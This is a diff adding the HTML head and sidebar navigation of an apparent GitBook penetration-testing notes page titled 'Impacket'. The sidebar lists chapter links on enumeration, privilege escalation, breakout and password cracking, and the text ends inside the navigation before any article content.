@@ -1,0 +1,2334 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Impacket · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="sharppersist.html" />
+    
+    
+    <link rel="prev" href="msbuildapicaller.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Initial page
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../table-of-content.html">
+            
+                <a href="../../table-of-content.html">
+            
+                    
+                    Table Of Content
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Infrastructure testing</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../enumeration/">
+            
+                <a href="../enumeration/">
+            
+                    
+                    Enumeration
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../enumeration/packet-capture.html">
+            
+                <a href="../enumeration/packet-capture.html">
+            
+                    
+                    Packet Capture
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../enumeration/host-disocvery.html">
+            
+                <a href="../enumeration/host-disocvery.html">
+            
+                    
+                    Host Discovery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../enumeration/services-ports/">
+            
+                <a href="../enumeration/services-ports/">
+            
+                    
+                    Services / Ports
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.3.1" data-path="../enumeration/services-ports/ftp.html">
+            
+                <a href="../enumeration/services-ports/ftp.html">
+            
+                    
+                    21 - FTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.2" data-path="../enumeration/services-ports/ssh.html">
+            
+                <a href="../enumeration/services-ports/ssh.html">
+            
+                    
+                    22 - SSH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.3" data-path="../enumeration/services-ports/smtp.html">
+            
+                <a href="../enumeration/services-ports/smtp.html">
+            
+                    
+                    25 - SMTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.4" data-path="../enumeration/services-ports/dns.html">
+            
+                <a href="../enumeration/services-ports/dns.html">
+            
+                    
+                    53 - DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.5" data-path="../enumeration/services-ports/dhcp.html">
+            
+                <a href="../enumeration/services-ports/dhcp.html">
+            
+                    
+                    67 - DHCP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.6" data-path="../enumeration/services-ports/69-tftp.html">
+            
+                <a href="../enumeration/services-ports/69-tftp.html">
+            
+                    
+                    69 - TFTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.7" data-path="../enumeration/services-ports/finger.html">
+            
+                <a href="../enumeration/services-ports/finger.html">
+            
+                    
+                    79 - Finger
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.8" data-path="../enumeration/services-ports/88-kerberos.html">
+            
+                <a href="../enumeration/services-ports/88-kerberos.html">
+            
+                    
+                    88 - Kerberos
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.9" data-path="../enumeration/services-ports/rpc.html">
+            
+                <a href="../enumeration/services-ports/rpc.html">
+            
+                    
+                    111 - RPC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.10" data-path="../enumeration/services-ports/ident.html">
+            
+                <a href="../enumeration/services-ports/ident.html">
+            
+                    
+                    113 - ident
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.11" data-path="../enumeration/services-ports/135-msrpc.html">
+            
+                <a href="../enumeration/services-ports/135-msrpc.html">
+            
+                    
+                    135 - MSRPC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.12" data-path="../enumeration/services-ports/netbios.html">
+            
+                <a href="../enumeration/services-ports/netbios.html">
+            
+                    
+                    137 - Netbios
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.13" data-path="../enumeration/services-ports/smb.html">
+            
+                <a href="../enumeration/services-ports/smb.html">
+            
+                    
+                    139/445 - SMB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.14" data-path="../enumeration/services-ports/snmp.html">
+            
+                <a href="../enumeration/services-ports/snmp.html">
+            
+                    
+                    161 - SNMP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.15" data-path="../enumeration/services-ports/xdmcp.html">
+            
+                <a href="../enumeration/services-ports/xdmcp.html">
+            
+                    
+                    177 - XDMCP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.16" data-path="../enumeration/services-ports/ldap.html">
+            
+                <a href="../enumeration/services-ports/ldap.html">
+            
+                    
+                    363 - LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.17" data-path="../enumeration/services-ports/443-https.html">
+            
+                <a href="../enumeration/services-ports/443-https.html">
+            
+                    
+                    443 - HTTPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.18" data-path="../enumeration/services-ports/ike.html">
+            
+                <a href="../enumeration/services-ports/ike.html">
+            
+                    
+                    500 - IKE (IPSEC)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.19" data-path="../enumeration/services-ports/rservices.html">
+            
+                <a href="../enumeration/services-ports/rservices.html">
+            
+                    
+                    512/513/514 - R Services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.20" data-path="../enumeration/services-ports/ipmi.html">
+            
+                <a href="../enumeration/services-ports/ipmi.html">
+            
+                    
+                    623 - IPMI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.21" data-path="../enumeration/services-ports/873-rsync.html">
+            
+                <a href="../enumeration/services-ports/873-rsync.html">
+            
+                    
+                    873 - RSYNC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.22" data-path="../enumeration/services-ports/1099-java-rmi.html">
+            
+                <a href="../enumeration/services-ports/1099-java-rmi.html">
+            
+                    
+                    1099 - Java RMI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.23" data-path="../enumeration/services-ports/1433-microsoft-sql.html">
+            
+                <a href="../enumeration/services-ports/1433-microsoft-sql.html">
+            
+                    
+                    1433 - Microsoft SQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.24" data-path="../enumeration/services-ports/1521-oracle-db.html">
+            
+                <a href="../enumeration/services-ports/1521-oracle-db.html">
+            
+                    
+                    1521 - Oracle DB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.25" data-path="../enumeration/services-ports/nfs.html">
+            
+                <a href="../enumeration/services-ports/nfs.html">
+            
+                    
+                    2049 - NFS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.26" data-path="../enumeration/services-ports/3306-mysql.html">
+            
+                <a href="../enumeration/services-ports/3306-mysql.html">
+            
+                    
+                    3306 - MySQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.27" data-path="../enumeration/services-ports/3389-rdp.html">
+            
+                <a href="../enumeration/services-ports/3389-rdp.html">
+            
+                    
+                    3389 - RDP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.28" data-path="../enumeration/services-ports/5432-postgressql.html">
+            
+                <a href="../enumeration/services-ports/5432-postgressql.html">
+            
+                    
+                    5432 - PostgresSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.29" data-path="../enumeration/services-ports/vnc.html">
+            
+                <a href="../enumeration/services-ports/vnc.html">
+            
+                    
+                    5900 - VNC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.30" data-path="../enumeration/services-ports/winrm.html">
+            
+                <a href="../enumeration/services-ports/winrm.html">
+            
+                    
+                    5985 - WinRM
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.31" data-path="../enumeration/services-ports/x11.html">
+            
+                <a href="../enumeration/services-ports/x11.html">
+            
+                    
+                    6000 - X11
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.32" data-path="../enumeration/services-ports/redis.html">
+            
+                <a href="../enumeration/services-ports/redis.html">
+            
+                    
+                    6379 - Redis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.33" data-path="../enumeration/services-ports/memcached.html">
+            
+                <a href="../enumeration/services-ports/memcached.html">
+            
+                    
+                    11211 - Memcached
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.34" data-path="../enumeration/services-ports/rds.html">
+            
+                <a href="../enumeration/services-ports/rds.html">
+            
+                    
+                    RDS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.35" data-path="../enumeration/services-ports/sqlite.html">
+            
+                <a href="../enumeration/services-ports/sqlite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.36" data-path="../enumeration/services-ports/docker.html">
+            
+                <a href="../enumeration/services-ports/docker.html">
+            
+                    
+                    Docker
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../enumeration/ipv6/">
+            
+                <a href="../enumeration/ipv6/">
+            
+                    
+                    IPV6
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.4.1" data-path="../enumeration/ipv6/scanning.html">
+            
+                <a href="../enumeration/ipv6/scanning.html">
+            
+                    
+                    Scanning
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.2" data-path="../enumeration/ipv6/enumeration.html">
+            
+                <a href="../enumeration/ipv6/enumeration.html">
+            
+                    
+                    Enumeration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.3" data-path="../enumeration/ipv6/transfering-files.html">
+            
+                <a href="../enumeration/ipv6/transfering-files.html">
+            
+                    
+                    Transfering files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.4" data-path="../enumeration/ipv6/pivoting-and-routes.html">
+            
+                <a href="../enumeration/ipv6/pivoting-and-routes.html">
+            
+                    
+                    Pivoting and routes
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.5" data-path="../enumeration/ipv6/thc-ipv6.html">
+            
+                <a href="../enumeration/ipv6/thc-ipv6.html">
+            
+                    
+                    THC IPv6
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../gaining-access/">
+            
+                <a href="../gaining-access/">
+            
+                    
+                    Gaining Access
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../gaining-access/ip-forwarding.html">
+            
+                <a href="../gaining-access/ip-forwarding.html">
+            
+                    
+                    IP Forwarding
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../gaining-access/vlan-hopping.html">
+            
+                <a href="../gaining-access/vlan-hopping.html">
+            
+                    
+                    VLAN hopping
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../gaining-access/psexec.html">
+            
+                <a href="../gaining-access/psexec.html">
+            
+                    
+                    Psexec
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../gaining-access/upgrading-shell.html">
+            
+                <a href="../gaining-access/upgrading-shell.html">
+            
+                    
+                    Upgrading shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.5" data-path="../gaining-access/reverse-shells-one-liners.html">
+            
+                <a href="../gaining-access/reverse-shells-one-liners.html">
+            
+                    
+                    Reverse Shells One-Liners
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.6" data-path="../gaining-access/bruteforce.html">
+            
+                <a href="../gaining-access/bruteforce.html">
+            
+                    
+                    Bruteforce
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.7" data-path="../gaining-access/mitm-cleartext-protocols.html">
+            
+                <a href="../gaining-access/mitm-cleartext-protocols.html">
+            
+                    
+                    MITM cleartext protocols
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.8" data-path="../gaining-access/null-session.html">
+            
+                <a href="../gaining-access/null-session.html">
+            
+                    
+                    Null session
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.9" data-path="../gaining-access/llmnr-nbt-ns-spoofing.html">
+            
+                <a href="../gaining-access/llmnr-nbt-ns-spoofing.html">
+            
+                    
+                    LLMNR / NBT NS Spoofing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.10" data-path="../gaining-access/port-knocking.html">
+            
+                <a href="../gaining-access/port-knocking.html">
+            
+                    
+                    Port knocking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.11" data-path="../gaining-access/downloading-transfer-files.html">
+            
+                <a href="../gaining-access/downloading-transfer-files.html">
+            
+                    
+                    Downloading/Transfer files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.12" data-path="../gaining-access/remote-desktop.html">
+            
+                <a href="../gaining-access/remote-desktop.html">
+            
+                    
+                    Remote Desktop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.13" data-path="../gaining-access/nac-bypass.html">
+            
+                <a href="../gaining-access/nac-bypass.html">
+            
+                    
+                    NAC Bypass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.14" data-path="../gaining-access/pass-the-hash.html">
+            
+                <a href="../gaining-access/pass-the-hash.html">
+            
+                    
+                    Pass-The-Hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../exploitation/">
+            
+                <a href="../exploitation/">
+            
+                    
+                    Exploitation
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../exploitation/solaris.html">
+            
+                <a href="../exploitation/solaris.html">
+            
+                    
+                    Solaris
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../exploitation/ipv6.html">
+            
+                <a href="../exploitation/ipv6.html">
+            
+                    
+                    IPv6
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3" data-path="../exploitation/windows/">
+            
+                <a href="../exploitation/windows/">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.3.1" data-path="../exploitation/windows/compiling-code.html">
+            
+                <a href="../exploitation/windows/compiling-code.html">
+            
+                    
+                    Compiling Code
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3.2" data-path="../exploitation/windows/smb-vulnaribilites.html">
+            
+                <a href="../exploitation/windows/smb-vulnaribilites.html">
+            
+                    
+                    SMB Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3.3" data-path="../exploitation/windows/kerberos-attacks.html">
+            
+                <a href="../exploitation/windows/kerberos-attacks.html">
+            
+                    
+                    Kerberos Attacks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../privilege-esclation/">
+            
+                <a href="../privilege-esclation/">
+            
+                    
+                    Privilege Escalation
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../privilege-esclation/situational-awareness/">
+            
+                <a href="../privilege-esclation/situational-awareness/">
+            
+                    
+                    Situational Awareness
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1.1" data-path="../privilege-esclation/situational-awareness/linux.html">
+            
+                <a href="../privilege-esclation/situational-awareness/linux.html">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.1.2" data-path="../privilege-esclation/situational-awareness/windows/">
+            
+                <a href="../privilege-esclation/situational-awareness/windows/">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1.2.1" data-path="../privilege-esclation/situational-awareness/windows/registry.html">
+            
+                <a href="../privilege-esclation/situational-awareness/windows/registry.html">
+            
+                    
+                    Registry
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.1.2.2" data-path="../privilege-esclation/situational-awareness/windows/powerview.html">
+            
+                <a href="../privilege-esclation/situational-awareness/windows/powerview.html">
+            
+                    
+                    PowerView
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.1.2.3" data-path="../privilege-esclation/situational-awareness/windows/fsmo-roles.html">
+            
+                <a href="../privilege-esclation/situational-awareness/windows/fsmo-roles.html">
+            
+                    
+                    FSMO Roles
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../privilege-esclation/windows/">
+            
+                <a href="../privilege-esclation/windows/">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.2.1" data-path="../privilege-esclation/windows/disable-apps-and-firewall.html">
+            
+                <a href="../privilege-esclation/windows/disable-apps-and-firewall.html">
+            
+                    
+                    Disable Apps and Firewall
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.2" data-path="../privilege-esclation/windows/add-user-script.html">
+            
+                <a href="../privilege-esclation/windows/add-user-script.html">
+            
+                    
+                    Add user script
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.3" data-path="../privilege-esclation/windows/uac-bypass.html">
+            
+                <a href="../privilege-esclation/windows/uac-bypass.html">
+            
+                    
+                    UAC Bypass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.4" data-path="../privilege-esclation/windows/icacls.html">
+            
+                <a href="../privilege-esclation/windows/icacls.html">
+            
+                    
+                    icacls
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.5" data-path="../privilege-esclation/windows/running-services.html">
+            
+                <a href="../privilege-esclation/windows/running-services.html">
+            
+                    
+                    Running services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.6" data-path="../privilege-esclation/windows/common-exploits.html">
+            
+                <a href="../privilege-esclation/windows/common-exploits.html">
+            
+                    
+                    Common Exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.3" data-path="../privilege-esclation/linux/">
+            
+                <a href="../privilege-esclation/linux/">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.3.1" data-path="../privilege-esclation/linux/suid-shell-script.html">
+            
+                <a href="../privilege-esclation/linux/suid-shell-script.html">
+            
+                    
+                    SUID Shell script
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.3.2" data-path="../privilege-esclation/linux/cve-2019-14287.html">
+            
+                <a href="../privilege-esclation/linux/cve-2019-14287.html">
+            
+                    
+                    CVE-2019-14287
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.3.3" data-path="../privilege-esclation/linux/kernel-exploit.html">
+            
+                <a href="../privilege-esclation/linux/kernel-exploit.html">
+            
+                    
+                    Kernel exploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.4" data-path="../privilege-esclation/solaris.html">
+            
+                <a href="../privilege-esclation/solaris.html">
+            
+                    
+                    Solaris
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.5" data-path="../privilege-esclation/freebsd.html">
+            
+                <a href="../privilege-esclation/freebsd.html">
+            
+                    
+                    FreeBSD
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.6" data-path="../privilege-esclation/automated-tools.html">
+            
+                <a href="../privilege-esclation/automated-tools.html">
+            
+                    
+                    Automated tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.7" data-path="../privilege-esclation/metasploit-modules.html">
+            
+                <a href="../privilege-esclation/metasploit-modules.html">
+            
+                    
+                    Metasploit Modules
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.8" data-path="../privilege-esclation/password-dumping.html">
+            
+                <a href="../privilege-esclation/password-dumping.html">
+            
+                    
+                    Password Dumping
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="../breakout/">
+            
+                <a href="../breakout/">
+            
+                    
+                    Breakout
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.5.1" data-path="../breakout/lolbas.html">
+            
+                <a href="../breakout/lolbas.html">
+            
+                    
+                    LOLBas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.2" data-path="../breakout/powershell-constrained-language-byass.html">
+            
+                <a href="../breakout/powershell-constrained-language-byass.html">
+            
+                    
+                    powershell constrained language byass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.3" data-path="../breakout/alternatives-to-command-prompt.md">
+            
+                <span>
+            
+                    
+                    Alternatives to command prompt
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.4" data-path="../breakout/windows-utilities.html">
+            
+                <a href="../breakout/windows-utilities.html">
+            
+                    
+                    Windows utilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.5" data-path="../breakout/applocker.html">
+            
+                <a href="../breakout/applocker.html">
+            
+                    
+                    Applocker
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.6" data-path="../breakout/restricted-shells.html">
+            
+                <a href="../breakout/restricted-shells.html">
+            
+                    
+                    Restricted shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.7" data-path="../breakout/environmental-variables-bypassing-path-restrictions.html">
+            
+                <a href="../breakout/environmental-variables-bypassing-path-restrictions.html">
+            
+                    
+                    Environmental Variables / Bypassing Path Restrictions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.8" data-path="../breakout/docker-escape.html">
+            
+                <a href="../breakout/docker-escape.html">
+            
+                    
+                    Docker escape
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="../presistance/">
+            
+                <a href="../presistance/">
+            
+                    
+                    Presistance
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.6.1" data-path="../presistance/windows.html">
+            
+                <a href="../presistance/windows.html">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="../pivoting/">
+            
+                <a href="../pivoting/">
+            
+                    
+                    Pivoting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.7.1" data-path="../pivoting/adding-routes.html">
+            
+                <a href="../pivoting/adding-routes.html">
+            
+                    
+                    Adding routes
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8" data-path="../password-cracking/">
+            
+                <a href="../password-cracking/">
+            
+                    
+                    Password Cracking
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.8.1" data-path="../password-cracking/hashcat.html">
+            
+                <a href="../password-cracking/hashcat.html">
+            
+                    
+                    Hashcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.2" data-path="../password-cracking/john.html">
+            
+                <a href="../password-cracking/john.html">
+            
+                    
+                    John
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.3" data-path="../password-cracking/cisco-passwords.html">
+            
+                <a href="../password-cracking/cisco-passwords.html">
+            
+                    
+                    Cisco Passwords
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.4" data-path="../password-cracking/passwords-lists.html">
+            
+                <a href="../password-cracking/passwords-lists.html">
+            
+                    
+                    Passwords Lists
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.5" data-path="../password-cracking/generating-wordlist.html">
+            
+                <a href="../password-cracking/generating-wordlist.html">
+            
+                    
+                    Generating wordlist
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Tools
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.9.1" data-path="nishang.html">
+            
+                <a href="nishang.html">
+            
+                    
+                    Nishang
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.2" data-path="uacme.html">
+            
+                <a href="uacme.html">
+            
+                    
+                    UACME
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.3" data-path="bypass-uac.html">
+            
+                <a href="bypass-uac.html">
+            
+                    
+                    Bypass-UAC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.4" data-path="msbuildapicaller.html">
+            
+                <a href="msbuildapicaller.html">
+            
+                    
+                    MSBuildAPICaller
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.9.5" data-path="impacket.html">
+            
+                <a href="impacket.html">
+            
+                    
+                    Impacket
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.6" data-path="sharppersist.html">
+            
+                <a href="sharppersist.html">
+            
+                    
+                    SharpPersist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.7" data-path="terminals.html">
+            
+                <a href="terminals.html">
+            
+                    
+                    Terminals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.8" data-path="ip-calculation.html">
+            
+                <a href="ip-calculation.html">
+            
+                    
+                    IP Calculation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.9" data-path="pwsh.html">
+            
+                <a href="pwsh.html">
+            
+                    
+                    pwsh
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.10" data-path="pstools-sysinternals.html">
+            
+                <a href="pstools-sysinternals.html">
+            
+                    
+                    psTools / Sysinternals
+            
+                </a>
+            
+
+            
+        </li>
+    
